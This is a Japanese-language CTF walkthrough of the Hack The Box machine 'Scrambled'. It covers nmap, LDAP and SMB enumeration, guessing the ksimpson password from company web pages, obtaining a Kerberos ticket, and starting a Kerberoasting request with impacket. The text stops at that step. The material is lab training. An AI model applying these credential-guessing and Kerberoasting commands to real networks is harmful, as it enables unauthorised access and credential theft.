![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/476
- #medium
- OS : #Windows
- Machine Author(s): [VbScrub](https://app.hackthebox.com/users/158833)
- Hack Date: 2025-08-12

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ



## Nmap
ドメイン
- scrm.local
- DC1.scrm.local

| ポート       | サービス         | バージョン                                       | その他                                                                                                 |
| --------- | ------------ | ------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| 53/tcp    | **DNS**      | Simple DNS Plus                             |                                                                                                     |
| 80/tcp    | **http**     | Microsoft IIS httpd 10.0                    | http-title: Scramble Corp Intranet; Supported Methods: OPTIONS TRACE GET HEAD POST; TRACE risky     |
| 88/tcp    | **kerberos** | Microsoft Windows Kerberos                  | Server time: 2025-08-12 09:19:32Z                                                                   |
| 135/tcp   | msrpc        | Microsoft Windows RPC                       |                                                                                                     |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn               |                                                                                                     |
| 389/tcp   | **ldap**     | Microsoft Windows Active Directory LDAP     | Domain: scrm.local0., Site: Default-First-Site-Name; SSL cert issued by scrm-DC1-CA                 |
| 445/tcp   | **SMB**      | ?                                           |                                                                                                     |
| 464/tcp   | kpasswd5     | ?                                           |                                                                                                     |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0         |                                                                                                     |
| 636/tcp   | **LDAPS**    | Microsoft Windows Active Directory LDAP     | Domain: scrm.local0., Site: Default-First-Site-Name; SSL cert issued by scrm-DC1-CA                 |
| 1433/tcp  | **MSSQL**    | Microsoft SQL Server 2019 RTM 15.00.2000.00 |                                                                                                     |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP     | Global Catalog; Domain: scrm.local0., Site: Default-First-Site-Name                                 |
| 3269/tcp  | ssl/ldap     | Microsoft Windows Active Directory LDAP     | Global Catalog; Domain: scrm.local0., Site: Default-First-Site-Name; SSL cert issued by scrm-DC1-CA |
| 4411/tcp  | unknown      | SCRAMBLECORP_ORDERS_V1.0.3                  |                                                                                                     |
| 5985/tcp  | **WinRM**    | Microsoft HTTPAPI httpd 2.0                 |                                                                                                     |
| 9389/tcp  | mc-nmf       | .NET Message Framing                        |                                                                                                     |
| 49667/tcp | msrpc        | Microsoft Windows RPC                       |                                                                                                     |
| 49673/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0         |                                                                                                     |
| 49674/tcp | msrpc        | Microsoft Windows RPC                       |                                                                                                     |
| 49701/tcp | msrpc        | Microsoft Windows RPC                       |                                                                                                     |
| 49712/tcp | msrpc        | Microsoft Windows RPC                       |                                                                                                     |
| 62956/tcp | msrpc        | Microsoft Windows RPC                       |                                                                                                     |

```bash
Bug in ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-12 09:19:32Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-12T09:22:44+00:00; -2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-12T09:22:44+00:00; -2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.20.155:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-12T08:49:07
| Not valid after:  2055-08-12T08:49:07
| MD5:   ff9a:156b:7e4d:dee0:4bbf:1fda:191c:14bd
| SHA-1: 6723:3b7e:e7e9:2ff8:2c9e:8178:1663:40b6:49e6:620d
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-12T09:22:44+00:00; 0s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-12T09:22:44+00:00; -2s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-12T09:22:44+00:00; -2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
4411/tcp  open  found?        syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62956/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.95%I=7%D=8/12%Time=689B0723%P=aarch64-unknown-linux-gn
SF:u%r(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V
SF:1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1
SF:D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_O
SF:RDERS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR
SF:_UNKNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")
SF:%r(TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,
SF:"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDE
SF:RS_V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(FourOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C
SF:OMMAND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UN
SF:KNOWN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\
SF:r\n")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOption
SF:s,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(L
SF:ANDesk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0
SF:\.3;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI
SF:,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_
SF:ORDERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;
SF:\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/12%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=689B07EF%P=aarch64-unknown-linux-gnu)
SEQ(SP=103%GCD=1%ISR=104%TI=I%II=I%SS=S%TS=U)
SEQ(SP=107%GCD=1%ISR=106%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 1s, median: -2s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 9741/tcp): CLEAN (Timeout)
|   Check 2 (port 10240/tcp): CLEAN (Timeout)
|   Check 3 (port 23779/udp): CLEAN (Timeout)
|   Check 4 (port 17332/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-08-12T09:22:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   81.39 ms 10.10.14.1
2   81.42 ms 10.129.20.155

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:22
Completed NSE at 02:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:22
Completed NSE at 02:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:22
Completed NSE at 02:22, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.33 seconds
           Raw packets sent: 106 (8.372KB) | Rcvd: 52 (2.880KB)

```
- 4411が気になる
	- SCRAMBLECORP_ORDERS_V1.0.3
## SMB
- 匿名ログインできるか
	- できない
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ smbclient -N -L //$Target_IP
session setup failed: NT_STATUS_NOT_SUPPORTED
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ smbclient -N -L //10.129.20.155
session setup failed: NT_STATUS_NOT_SUPPORTED

```

## LDAP
- 匿名で　ダンプできるか
	- できる
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ ldapsearch -x -H ldap://$Target_IP -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=scrm,DC=local
ldapServiceName: scrm.local:dc1$@SCRM.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2

<SNIP>
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=scrm,DC=local
serverName: CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura
 tion,DC=scrm,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingContexts: DC=scrm,DC=local
namingContexts: CN=Configuration,DC=scrm,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingContexts: DC=DomainDnsZones,DC=scrm,DC=local
namingContexts: DC=ForestDnsZones,DC=scrm,DC=local
isSynchronized: TRUE
highestCommittedUSN: 295075
dsServiceName: CN=NTDS Settings,CN=DC1,CN=Servers,CN=Default-First-Site-Name,C
 N=Sites,CN=Configuration,DC=scrm,DC=local
dnsHostName: DC1.scrm.local
defaultNamingContext: DC=scrm,DC=local
currentTime: 20250812093104.0Z
configurationNamingContext: CN=Configuration,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

- でもLdapDomaindumpは成功しない
	- 情報が空になってしまう
## Enum4Linux-ng
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ enum4linux-ng -A  $Target_IP
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.20.155
[*] Username ......... ''
[*] Random Username .. 'pccyoowf'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.20.155    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.20.155    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: scrm.local

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.20.155    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.20.155    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true                                                                                                                                                                            
Preferred dialect: SMB 3.0                                                                                                                                                                   
SMB1 only: false                                                                                                                                                                             
SMB signing required: true                                                                                                                                                                   

 ============================================================
|    Domain Information via SMB session for 10.129.20.155    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[-] Could not enumerate domain information via unauthenticated SMB
[*] Enumerating via unauthenticated SMB session on 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    RPC Session Check on 10.129.20.155    |
 ==========================================
[*] Check for null session
[-] Could not establish null session: STATUS_NOT_SUPPORTED
[*] Check for random user
[-] Could not establish random user session: STATUS_NOT_SUPPORTED
[-] Sessions failed, neither null nor user sessions were possible

 ================================================
|    OS Information via RPC for 10.129.20.155    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: unknown                                                                                                                                                                                  
OS version: not supported                                                                                                                                                                    
OS release: null                                                                                                                                                                             
OS build: null                                                                                                                                                                               
Native OS: not supported                                                                                                                                                                     
Native LAN manager: not supported                                                                                                                                                            
Platform id: null                                                                                                                                                                            
Server type: null                                                                                                                                                                            
Server type string: null                                                                                                                                                                     

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 11.11 seconds

```

## nxc
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ nxc ldap scrm.local -u 'guest' -p '' --users
LDAP        10.129.20.155   389    DC1              [*] None (name:DC1) (domain:scrm.local)
LDAP        10.129.20.155   389    DC1              [-] scrm.local\guest: STATUS_NOT_SUPPORTED
                                                                                                 
```

## WebSite
-  `http://10.129.20.155/index.html`
![](https://i.imgur.com/2RUOXW5.png)

- `http://10.129.20.155/support.html`
	- 2021年4月9日: 先月のセキュリティ侵害により、**ネットワーク上のすべての NTLM 認証 を無効化**しました。
	- これにより、あなたが使用している一部のプログラムに問題が発生する可能性がありますが、
	- 私たちは問題解決に向けて作業中ですので、どうかご理解ください。
![](https://i.imgur.com/1evbraW.png)

- `http://10.129.20.155/supportrequest.html`
![](https://i.imgur.com/h8TDrzV.png)


- `http://10.129.20.155/newuser.html`
	- 新入社員のユーザーアカウントを申請する場合は、以下のフォームに記入してください。
	- 完了後、新しいユーザーの詳細情報をその社員のマネージャーへ送付します。
![](https://i.imgur.com/AitbGw6.png)



- `http://10.129.20.155/salesorders.html`
- 販売注文アプリのトラブルシューティング
	- 販売注文アプリで問題が発生している場合は、デバッグログを有効にしてから問題を再現してください。
		- デバッグログを有効にするには、次の手順を行います。
	1.	サインインする前に、下記でハイライトされている 「編集 (Edit)」 リンクをクリックします。
	2.	表示された新しいウィンドウで、デバッグログを有効にする オプションにチェックを入れ、「OK」をクリックします。
	3.	通常通りサインインし、問題を再現します。
	4.	「Sales App」を起動したのと同じフォルダ内に ScrambleDebugLog という名前のログファイルが作成されます。このファイルと問題の説明をメールで当社に送ってください。

- `http://scrm.local/salesorders.html`
	- なんかappがあるってこと？
![](https://i.imgur.com/DMcqHyH.png)

![](https://i.imgur.com/RGPsrAI.png)

- `http://10.129.20.155/passwords.html`
	- パスワードリセット
	- 当社のセルフサービスによるパスワードリセットシステムは間もなく稼働予定ですが、それまではITサポート窓口にお電話ください。こちらでパスワードをリセットします。
	- もし担当者が不在の場合は、ユーザー名 を明記したメッセージを残してください。**パスワードを ユーザー名と同じ にリセットいたします。**
![](https://i.imgur.com/oQgGCHn.png)

webを、見ると
ユーザー名がわかれば、　ユーザー名=パスワードになってる可能性があるアカウントがあるかもしれない
どっかにアプリがあるってこと？

## Whatweb
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ whatweb http://10.129.20.155/            
http://10.129.20.155/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.20.155], JQuery, Microsoft-IIS[10.0], Script, Title[Scramble Corp Intranet]
```

アプリを探す
## サブドメインの列挙
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://scrm.local -H "Host: FUZZ.scrm.local" -fs 2313

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://scrm.local
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.scrm.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2313
________________________________________________

:: Progress: [100000/100000] :: Job [1/1] :: 381 req/sec :: Duration: [0:04:13] :: Errors: 40 ::

```


## Dirsearch
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ sudo dirsearch --url=http://scrm.local/ --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple 
[sudo] password for kali: 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29999

Output File: /home/kali/Desktop/HTB/machine/Scrambled/reports/http_scrm.local/__25-08-12_03-27-55.txt

Target: http://scrm.local/

[03:27:55] Starting: 
[03:28:00] 301 -  148B  - /images  ->  http://scrm.local/images/            
[03:28:00] 301 -  148B  - /assets  ->  http://scrm.local/assets/            
[03:28:00] 301 -  148B  - /Images  ->  http://scrm.local/Images/            
[03:28:03] 301 -  148B  - /Assets  ->  http://scrm.local/Assets/            
[03:28:07] 301 -  148B  - /IMAGES  ->  http://scrm.local/IMAGES/            
[03:29:18] 400 -  324B  - /error%1F_log                                     
                                                                             
Task Completed

```

ここで、サイト内の`http://scrm.local/supportrequest.html`にある
- cmdの画像からのユーザー名`ksimpson`が取得できる
- そして、`http://10.129.20.155/passwords.html`から、パスワードとユーザー名が一緒の可能性があるとのことから、パスワードもksimpsonではないかとわかる
![](https://i.imgur.com/lXYoWdR.png)

## SMB(再)

SMBで確かめてみる
- しかし、NT_STATUS_NOT_SUPPORTEDエラーが出る
- SMBは、NTLM を無効化していて、Kerberos でしか認証させないために起きている
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ smbclient -L 10.129.20.155 -U 'ksimpson%ksimpson'
session setup failed: NT_STATUS_NOT_SUPPORTED
```

KerberosのTgtを取得する
- NTP同期させる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ sudo ntpdate -u DC1.scrm.local
[sudo] password for kali: 
2025-08-12 04:28:32.621828 (-0700) +0.612197 +/- 0.040886 DC1.scrm.local 10.129.20.155 s1 no-leap
CLOCK: time stepped by 0.612197

```

チケットを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip 10.129.20.155 -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Trying to connect to KDC at 10.129.20.155:88
[+] Trying to connect to KDC at 10.129.20.155:88
[*] Saving ticket in ksimpson.ccache
```

チケット設定、確認する
```sh
└─$ export KRB5CCNAME="$(pwd)/ksimpson.ccache"
klist                    
Ticket cache: FILE:/home/kali/Desktop/HTB/machine/Scrambled/ksimpson.ccache
Default principal: ksimpson@SCRM.LOCAL

Valid starting     Expires            Service principal
08/12/25 04:29:06  08/12/25 14:29:06  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 08/13/25 04:29:06
```

SMBで、TGT使ってログインする
- ログイン成功
- ITフォルダとPublicフォルダが気になる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ impacket-smbclient -k -no-pass SCRM.LOCAL/ksimpson@DC1.scrm.local -dc-ip 10.129.20.155
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
```

Publicフォルダの中身をみると、「Network Security Changes.pdf」があるので取得する
```
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 15:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 15:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 10:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
```

ITフォルダは閲覧できない
```
# use IT
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

## Network Security Changes.pdfの中身
![](https://i.imgur.com/FY4t2vZ.png)

日本語訳

日付: 2021年4月9日
宛先: 全社員各位
作成者: ITサポート

ご存知の方もいるかもしれませんが、最近当社ネットワークが侵害され、攻撃者が全データにアクセスできる状態になっていました。
攻撃者が侵入した経路を特定し、以下のような即時対応を行いました。それに伴う影響と対応方法も併せて記載します。
変更点 1:
攻撃者は「NTLMリレー」と呼ばれる手法を利用したため、ネットワーク全体でNTLM認証を無効化しました。
影響を受けるユーザー: 全員
回避策:
今後はログオンやネットワークリソースへのアクセス時に Kerberos認証 を使用します
（もちろん Kerberos は 100% 安全で、悪用の余地など絶対にありません…多分）。
そのため、ユーザー名やアクセスするサーバー名には必ずフルドメイン名（例: scrm.local）を付けてください。

変更点 2:
攻撃者は当社のHRソフトが使用するSQLデータベースから認証情報を取得したため、ネットワーク管理者以外のすべてのユーザーからSQLサービスへのアクセスを遮断しました。
影響を受けるユーザー: 人事部
回避策:
HRソフトにアクセスできなくなった場合はITサポートまでご連絡ください。手動でアカウントにアクセス権を付与します。


KerberoustingとAS-REP Roastingを試す
- Kerberoustingが成功して、sqlsvcユーザーのTGSを保存できた
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Scrambled]
└─$ impacket-GetUserSPNs -k -no-pass \
  scrm.local/ksimpson \
  -dc-ip 10.129.20.155 \
  -dc-host DC1.scrm.local \
  -request -outputfile tgs_hashes.txt -debug 
